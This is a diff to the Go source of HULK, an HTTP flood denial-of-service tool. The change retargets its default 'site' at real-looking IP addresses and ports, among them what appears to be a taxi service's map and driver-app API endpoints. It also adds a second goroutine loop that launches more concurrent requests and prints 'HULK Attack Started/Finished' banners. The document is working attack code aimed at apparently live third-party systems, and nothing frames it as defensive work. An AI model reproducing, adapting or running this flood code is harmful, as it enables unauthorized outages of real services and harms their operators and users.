@@ -87,7 +87,8 @@ func main() {
 	flag.BoolVar(&version, "version", false, "print version and exit")
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
 	// flag.StringVar(&site, "site", "http://map.uz.taxi:8080/reverse?format=jsonv2&lat=41.28407468291545&lon=69.26207811157667&addressdetails=1&accept-language=en", "Destination site.")
-	flag.StringVar(&site, "site", "http://213.230.120.184", "Destination site.")
+	flag.StringVar(&site, "site", "https://213.230.120.147:10011", "Destination site.")
+	// flag.StringVar(&site, "site", "http://213.230.120.184", "Destination site.")
 	// flag.StringVar(&site, "site", "https://217.30.171.176:3443/api/driver-app/1.0/dict/countries", "Destination site.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
@@ -142,11 +143,42 @@ func main() {
 			}
 			switch <-ss {
 			case callExitOnErr:
-				// atomic.AddInt32(&cur, -1)
+				atomic.AddInt32(&cur, -1)
 				err++
 			case callExitOnTooManyFiles:
-				// atomic.AddInt32(&cur, -1)
-				// maxproc--
+				atomic.AddInt32(&cur, -1)
+				maxproc--
+			case callGotOk:
+				sent++
+			case targetComplete:
+				sent++
+				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
+				os.Exit(0)
+			}
+		}
+	}()
+	go func() {
+		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
+		ss := make(chan uint8, 8)
+		var (
+			err, sent int32
+		)
+		fmt.Println("In use               |\tResp OK |\tGot err")
+		for {
+			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
+				go httpcall(site, u.Host, data, headers, ss)
+			}
+			if sent%10 == 0 {
+				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+			}
+			switch <-ss {
+			case callExitOnErr:
+				atomic.AddInt32(&cur, -1)
+				err++
+			case callExitOnTooManyFiles:
+				atomic.AddInt32(&cur, -1)
+				maxproc--
 			case callGotOk:
 				sent++
 			case targetComplete:
